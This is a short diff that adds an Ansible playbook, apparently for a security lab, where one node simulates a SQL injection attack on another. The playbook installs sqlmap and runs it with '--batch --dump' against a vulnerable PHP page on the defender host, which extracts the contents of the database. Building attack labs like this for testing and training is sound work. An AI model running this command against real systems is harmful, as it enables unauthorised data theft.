@@ -1,0 +1,13 @@
+---
+- name: Simulate SQL Injection Attack
+  hosts: attacker1          #node1 attacking node2
+  become: yes
+  tasks:
+    - name: Install necessary tools
+      yum:
+        name: sqlmap       #penetration testing tool that automates the process of detecting and exploiting SQL injection vulnerabilities
+        state: present
+
+    - name: Perform SQL Injection Attack
+      command: sqlmap -u "http://{{ hostvars['defender1']['ansible_host'] }}/vulnerable_page.php?id=1" --batch --dump
+        #tests a web application for SQL injection weaknesses and extracts data from the database.
